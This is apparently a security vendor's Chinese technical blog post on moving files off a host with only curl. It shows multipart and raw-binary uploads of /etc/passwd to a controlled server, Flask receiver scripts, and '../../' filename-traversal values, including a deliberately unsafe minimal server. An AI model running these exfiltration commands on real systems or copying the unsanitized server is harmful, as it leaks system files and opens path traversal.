阅读： 228

## ****一、背景介绍****

有时可能碰上用curl向外传送文件的需求，不考虑客户端有nc、perl或其他什么在场的情形，只有全功能curl在场，假设服务端可达、可控。这不是正经需求，我是正经人，所以一直没有碰上过，最近看Offensive BPF时有碰上，临时折腾一下。

☆ curl -F

1) “curl -F”所发数据在客户端执行

cd /tmp  
cp /etc/passwd /tmp/some.txt  
curl -F “file=@some.txt” -F “user=any” http://192.168.95.21:8080/upload

在服务端执行

nc -ln 192.168.95.21 8080 > raw.txt

raw.txt即”curl -F”发送出去的原始数据，如下

————————————————————————–  
POST /upload HTTP/1.1  
Host: 192.168.95.21:8080  
User-Agent: curl/7.81.0  
Accept: \*/\*  
Content-Length: 3132  
Content-Type: multipart/form-data; boundary=————————f3b2ed96520ef46e

————————–f3b2ed96520ef46e  
Content-Disposition: form-data; name=”file”; filename=”some.txt”  
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash  
…  
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin

————————–f3b2ed96520ef46e  
Content-Disposition: form-data; name=”user”

any  
————————–f3b2ed96520ef46e–  
————————————————————————–

网友「梦里的奇妙冒险」指出，如下命令可指定Content-Disposition中filename字段，使之包含../而不normalize它。

curl -F “file=@some.txt;filename=../../some.txt” -F “user=any” http://192.168.95.21:8080/upload

看man手册，还可指定Content-Type，而非自动识别(本例是text/plain)

curl -F “file=@some.txt;filename=../../some.txt;type=application/octet-stream” -F “user=any” http://192.168.95.21:8080/upload

起初我没去找curl指定filename字段的原生方案，当时用了个歪招，修改raw.txt中filename，同步修改Content-Length为3138，再用nc发送raw\_new.txt。

nc -n 192.168.95.21 8080 < raw\_new.txt

在Windows上修改raw\_new.txt，用记事本吧。顺便说一句，nc有个开关”-C”，使得发送CRLF，缺省发送LF。

无需filename包含../，只是测试Python版服务端能否规范化filename。”user=any”无需出现，仅为演示。

2) SimpleHTTPServer.py

下面是配套Python版服务端，接收”curl -F”传过来的文件，支持二进制文件，限制了文件大小、扩展名、存放目录。

————————————————————————–  
#! /usr/bin/env python3  
\# -\*- encoding: utf-8 -\*-  
#  
\# cd /tmp  
\# mkdir /tmp/upload  
\# python3 SimpleHTTPServer.py 192.168.95.21 8080  
#

import sys, os  
import flask  
import werkzeug

app = flask.Flask(\_\_name\_\_)  
#  
\# 不允许超过1MB，否则向客户端返回413错，会自动检查  
#  
\# 413 Request Entity Too Large  
\# The data value transmitted exceeds the capacity limit.  
#  
app.config\[‘MAX\_CONTENT\_LENGTH’\] = 1 \* 1024 \* 1024  
app.config\[‘UPLOAD\_FOLDER’\] = ‘/tmp/upload’  
#  
\# 只允许这些扩展名  
#  
app.config\[‘ALLOWED\_EXTENSIONS’\] = { ‘txt’, ‘bin’, ‘jpg’ }

def checkext ( filename ) :  
return ‘.’ in filename and filename.rsplit( ‘.’, 1 )\[1\] in app.config\[‘ALLOWED\_EXTENSIONS’\]

#  
\# 非必须  
#  
@app.route( “/” )  
def root () :  
return ‘SimpleHTTPServer is online.’

#  
\# 函数名任意  
#  
@app.route( “/upload”, methods=\[“POST”\] )  
def upload () :  
while True :  
try :  
file = flask.request.files\[‘file’\]  
filename = file.filename  
print( filename )  
#  
\# 不会自动检查app.config\[‘ALLOWED\_EXTENSIONS’\]，只能手工检查  
#  
if not checkext( filename ) :  
ret = ‘Unsupported ext’  
break  
#  
\# 消掉../  
#  
filename = werkzeug.utils.secure\_filename( filename )  
print( filename )  
filename = os.path.join( app.config\[‘UPLOAD\_FOLDER’\], filename )  
print( filename )  
user = flask.request.form.get( ‘user’, ‘unknown’ )  
file.save( filename )  
ret = ‘Upload succeed by ‘ + user  
except werkzeug.exceptions.BadRequestKeyError :  
ret = ‘Not found file key’  
break  
#  
\# end of while  
#

#  
\# 出现在HTTP响应中  
#  
return ret + ‘\\n’

if \_\_name\_\_ == ‘\_\_main\_\_’ :  
app.run( host=sys.argv\[1\], port=int( sys.argv\[2\], 0 ), debug=False )  
————————————————————————–

3) SimpleHTTPServer\_mini.py

SimpleHTTPServer.py很多代码出于演示目的而存在，如追求短小精悍，可删减。

————————————————————————–  
#! /usr/bin/env python3  
\# -\*- encoding: utf-8 -\*-  
#  
\# python3 SimpleHTTPServer\_mini.py 192.168.95.21 8080  
\# curl -F “file=@some.bin” http://192.168.95.21:8080/upload  
#

import sys, flask

app = flask.Flask(\_\_name\_\_)

@app.route( “/upload”, methods=\[“POST”\] )  
def upload () :  
file = flask.request.files\[‘file’\]  
#  
\# 危险！  
#  
file.save( file.filename )  
return ‘Upload succeed\\n’

if \_\_name\_\_ == ‘\_\_main\_\_’ :  
app.run( host=sys.argv\[1\], port=int( sys.argv\[2\], 0 ), debug=False )  
————————————————————————–

上述代码很危险，客户端提交的filename会危害服务端安全，谨慎使用。

4) SimpleHTTPClient.py

若是富客户端，不用”curl -F”时有许多其他选择，比如

————————————————————————–  
#! /usr/bin/env python3  
\# -\*- encoding: utf-8 -\*-  
#  
\# cd /tmp  
\# cp /usr/bin/ls /tmp/some.bin  
\# python3 SimpleHTTPClient.py http://192.168.95.21:8080/upload some.bin  
#

import sys, requests

url = sys.argv\[1\]  
filename = sys.argv\[2\]  
#  
\# curl -F “file=@some.bin;filename=../../some.bin;type=application/octet-stream”  
#  
\# file\_info = \\  
\# {  
\# ‘file’ :  
\# (  
\# ‘../../’ + filename,  
\# open( filename, ‘rb’ ),  
\# ‘application/octet-stream’  
\# )  
\# }  
file\_info = { ‘file’ : open( filename, ‘rb’ ) }  
other\_info = { ‘user’ : ‘any’ }  
#  
\# 除了files，还可以指定headers、cookies等  
#  
response = requests.post \\  
(  
url,  
files = file\_info,  
data = other\_info  
)  
print( response.text )  
————————————————————————–

☆ curl –data-binary

1) “curl –data-binary”所发数据

在客户端执行

cd /tmp  
cp /etc/passwd /tmp/some.txt  
curl –data-binary “@some.txt” http://192.168.95.21:8080/upload

在服务端执行

nc -ln 192.168.95.21 8080 > raw\_d.txt

raw\_d.txt即”curl –data-binary”发送出去的原始数据，如下

————————————————————————–  
POST /upload HTTP/1.1  
Host: 192.168.95.21:8080  
User-Agent: curl/7.81.0  
Accept: \*/\*  
Content-Length: 2850  
Content-Type: application/x-www-form-urlencoded

root:x:0:0:root:/root:/bin/bash  
…  
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin  
————————————————————————–

Content-Length精确对应some.txt的大小。application/x-www-form-urlencoded是这种用法的缺省Content-Type，可以更改。

curl –data-binary “@some.txt” -H “Content-Type: application/octet-stream” http://192.168.95.21:8080/upload

————————————————————————–  
POST /upload HTTP/1.1  
Host: 192.168.95.21:8080  
User-Agent: curl/7.81.0  
Accept: \*/\*  
Content-Type: application/octet-stream  
Content-Length: 2850

root:x:0:0:root:/root:/bin/bash  
…  
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin  
————————————————————————–

curl –data-binary “@some.txt” -H “Content-Type: application/octet-stream” -H “Filename: ../../some.txt” -H “User: any” http://192.168.95.21:8080/upload

————————————————————————–  
POST /upload HTTP/1.1  
Host: 192.168.95.21:8080  
User-Agent: curl/7.81.0  
Accept: \*/\*  
Content-Type: application/octet-stream  
Filename: ../../some.txt  
User: any  
Content-Length: 2850

root:x:0:0:root:/root:/bin/bash  
…  
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin  
————————————————————————–

无需Filename、User，仅为演示。

2) SimpleHTTPServer\_d.py

下面是配套Python版服务端，接收”curl –data-binary”传过来的文件，支持二进制文件，限制了文件大小、扩展名、存放目录。

————————————————————————–  
#! /usr/bin/env python3  
\# -\*- encoding: utf-8 -\*-  
#  
\# cd /tmp  
\# mkdir /tmp/upload  
\# python3 SimpleHTTPServer\_d.py 192.168.95.21 8080  
#

import sys, os, time  
import flask  
import werkzeug

app = flask.Flask(\_\_name\_\_)  
app.config\[‘MAX\_CONTENT\_LENGTH’\] = 1 \* 1024 \* 1024  
app.config\[‘UPLOAD\_FOLDER’\] = ‘/tmp/upload’  
app.config\[‘ALLOWED\_EXTENSIONS’\] = { ‘txt’, ‘bin’, ‘jpg’ }

def checkext ( filename ) :  
return ‘.’ in filename and filename.rsplit( ‘.’, 1 )\[1\] in app.config\[‘ALLOWED\_EXTENSIONS’\]

@app.route( “/” )  
def root () :  
return ‘SimpleHTTPServer\_d is online.’

@app.route( “/upload”, methods=\[“POST”\] )  
def upload () :  
while True :  
try :  
#  
\# 本例只能自己检查大小  
#  
length = flask.request.headers\[“Content-Length”\]  
length = int( length, 0 )  
if length > app.config\[‘MAX\_CONTENT\_LENGTH’\] :  
ret = “413 Request Entity Too Large”  
break  
#  
\# len(data)必等于Content-Length，假设指定小Content-Length、发  
\# 送大data，读取时会被截断  
#  
data = flask.request.get\_data()  
#  
\# filename = flask.request.headers.get( ‘Filename’, ‘random’ )  
#  
filename = flask.request.headers.get( ‘Filename’ )  
print( filename )  
if filename is None :  
filename = time.strftime( ‘%Y%m%d%H%M%S.bin’, time.localtime( time.time() ) )  
else :  
if not checkext( filename ) :  
ret = ‘Unsupported ext’  
break  
filename = werkzeug.utils.secure\_filename( filename )  
print( filename )  
filename = os.path.join( app.config\[‘UPLOAD\_FOLDER’\], filename )  
print( filename )  
user = flask.request.headers.get( ‘User’, ‘unknown’ )  
with open( filename, ‘wb’ ) as f :  
f.write( data )  
ret = ‘Upload succeed by ‘ + user  
except KeyError :  
ret = ‘Not found Content-Length’  
break  
#  
\# end of while  
#

return ret + ‘\\n’

if \_\_name\_\_ == ‘\_\_main\_\_’ :  
app.run( host=sys.argv\[1\], port=int( sys.argv\[2\], 0 ), debug=False )  
————————————————————————–

3) SimpleHTTPServer\_d\_mini.py

SimpleHTTPServer\_d.py很多代码出于演示目的而存在，如追求短小精悍，可删减。

————————————————————————–  
#! /usr/bin/env python3  
\# -\*- encoding: utf-8 -\*-  
#  
\# python3 SimpleHTTPServer\_d\_mini.py 192.168.95.21 8080  
\# curl –data-binary “@some.bin” http://192.168.95.21:8080/upload  
#

import sys, time, flask

app = flask.Flask(\_\_name\_\_)

@app.route( “/upload”, methods=\[“POST”\] )  
def upload () :  
data = flask.request.get\_data()  
filename = time.strftime( ‘%Y%m%d%H%M%S.bin’, time.localtime( time.time() ) )  
with open( filename, ‘wb’ ) as f :  
f.write( data )  
return ‘Upload succeed\\n’

if \_\_name\_\_ == ‘\_\_main\_\_’ :  
app.run( host=sys.argv\[1\], port=int( sys.argv\[2\], 0 ), debug=False )  
————————————————————————–

上述代码不存在filename的危险，但没有限制文件大小，可能消耗硬盘空间。

4) SimpleHTTPClient\_d.py

若是富客户端，不用”curl –data-binary”时有许多其他选择，比如

————————————————————————–  
#! /usr/bin/env python3  
\# -\*- encoding: utf-8 -\*-  
#  
\# cd /tmp  
\# cp /usr/bin/ls /tmp/some.bin  
\# python3 SimpleHTTPClient\_d.py http://192.168.95.21:8080/upload some.bin  
#

import sys, requests

url = sys.argv\[1\]  
filename = sys.argv\[2\]  
headers = \\  
{  
‘Content-Type’ : ‘application/octet-stream’,  
‘Filename’ : filename,  
‘User’ : ‘any’  
}  
with open( filename, ‘rb’ ) as f :  
response = requests.post \\  
(  
url,  
headers = headers,  
data = f  
)  
print( response.text )  
————————————————————————–

☆ 小结

不考虑安全风险的情况下，两种最简组合

python3 SimpleHTTPServer\_mini.py 192.168.95.21 8080curl -F “file=@some.bin” http://192.168.95.21:8080/upload

python3 SimpleHTTPServer\_d\_mini.py 192.168.95.21 8080curl –data-binary “@some.bin” http://192.168.95.21:8080/upload

第二组在服务端用时间戳当文件名，形如”20221018122537.bin”。

☆ 参考资源

\[1\] https://flask.palletsprojects.com/en/2.2.x/  
https://flask.palletsprojects.com/en/2.2.x/api/

\[2\] https://requests.readthedocs.io/en/latest/  
https://requests.readthedocs.io/en/latest/user/quickstart/  
https://requests.readthedocs.io/en/latest/api/

https://github.com/psf/requests

**版权声明**  
本站“技术博客”所有内容的版权持有者为绿盟科技集团股份有限公司（“绿盟科技”）。作为分享技术资讯的平台，绿盟科技期待与广大用户互动交流，并欢迎在标明出处（绿盟科技-技术博客）及网址的情形下，全文转发。  
上述情形之外的任何使用形式，均需提前向绿盟科技（010-68438880-5462）申请版权授权。如擅自使用，绿盟科技保留追责权利。同时，如因擅自使用博客内容引发法律纠纷，由使用者自行承担全部法律责任，与绿盟科技无关。